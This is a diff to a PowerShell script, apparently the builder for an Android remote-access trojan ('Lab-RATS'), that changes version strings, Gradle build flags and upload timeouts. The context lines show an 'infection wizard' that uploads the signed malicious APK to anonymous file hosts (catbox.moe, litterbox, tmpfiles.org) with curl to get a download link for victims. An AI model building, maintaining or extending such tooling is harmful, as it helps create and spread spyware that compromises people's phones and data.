@@ -1,6 +1,6 @@
 # ====================================================================
 #                   Lab-RATS PowerShell Builder
-#                         v1.5.1 Hardened
+#                         v1.6.0 Hardened
 # ====================================================================
 # Developed by K4N3CO © 2026
 
@@ -43,7 +43,7 @@ function Write-Banner {
     Write-Host " │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │" -ForegroundColor Cyan
     Write-Host " │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │" -ForegroundColor Cyan
     Write-Host " │                                                                       │" -ForegroundColor Cyan
-    Write-Host " │     ----------> Android APK Builder | v1.5.1 Hardened <----------     │" -ForegroundColor Cyan
+    Write-Host " │     ----------> Android APK Builder | v1.6.0 Hardened <----------     │" -ForegroundColor Cyan
     Write-Host " │                                                                       │" -ForegroundColor Cyan
     Write-Host " │   The one's who MIND don't matter. The one's who MATTER don't mind.   │" -ForegroundColor Cyan
     Write-Host " │                         DEVELOPED BY K4N3CO                           │" -ForegroundColor Cyan
@@ -189,7 +189,7 @@ function Build-Apk {
     Write-Host "[*] Initializing Build Engine..." -ForegroundColor Cyan
 
     Set-Location $ProjectDir
-    & .\gradlew.bat clean assembleRelease --no-daemon
+    & .\gradlew.bat assembleRelease --parallel
 
     $outputDir = Join-Path $ScriptDir "output"
     if (-not (Test-Path $outputDir)) { New-Item -ItemType Directory -Path $outputDir | Out-Null }
@@ -306,14 +306,14 @@ function Show-InfectionWizard {
         $downloadUrl = Read-Host "    Enter pre-hosted URL"
     } else {
         Write-Host "[*] Uploading to Catbox.moe..." -ForegroundColor Yellow
-        $resp = curl.exe -sS --connect-timeout 10 --max-time 180 -F "reqtype=fileupload" -F "fileToUpload=@$signedApk" https://catbox.moe/user/api.php 2>$null
+        $resp = curl.exe -sS --connect-timeout 5 --max-time 15 -F "reqtype=fileupload" -F "fileToUpload=@$signedApk" https://catbox.moe/user/api.php 2>$null
         if ($resp -notlike "http*") {
             Write-Host "[!] Catbox failed/unreachable. Trying Litterbox fallback..." -ForegroundColor Yellow
-            $resp = curl.exe -sS --connect-timeout 10 --max-time 180 -F "reqtype=fileupload" -F "time=72h" -F "fileToUpload=@$signedApk" https://litterbox.catbox.moe/resources/internals/api.php 2>$null
+            $resp = curl.exe -sS --connect-timeout 5 --max-time 15 -F "reqtype=fileupload" -F "time=72h" -F "fileToUpload=@$signedApk" https://litterbox.catbox.moe/resources/internals/api.php 2>$null
         }
         if ($resp -notlike "http*") {
             Write-Host "[!] Litterbox failed/unreachable. Trying Tmpfiles.org fallback..." -ForegroundColor Yellow
-            $json = curl.exe -sS --connect-timeout 10 --max-time 180 -F "file=@$signedApk" https://tmpfiles.org/api/v1/upload 2>$null
+            $json = curl.exe -sS --connect-timeout 5 --max-time 15 -F "file=@$signedApk" https://tmpfiles.org/api/v1/upload 2>$null
             if ($json -match '"url":"([^"]+)"') {
                 $rawUrl = $matches[1]
                 $resp = $rawUrl -replace "tmpfiles.org/", "tmpfiles.org/dl/"
@@ -367,7 +367,7 @@ function Show-InfectionWizard {
 
 function Show-Help {
     Write-Banner
-    Write-Host "COMMAND_DOCUMENTATION_V1.5.1" -ForegroundColor White
+    Write-Host "COMMAND_DOCUMENTATION_V1.6.0" -ForegroundColor White
     Write-Host "------------------------------------------------------------"
     Write-Host "1. Start Build: Standard production flow."
     Write-Host "2. Keystore Only: Unique signing certificate."
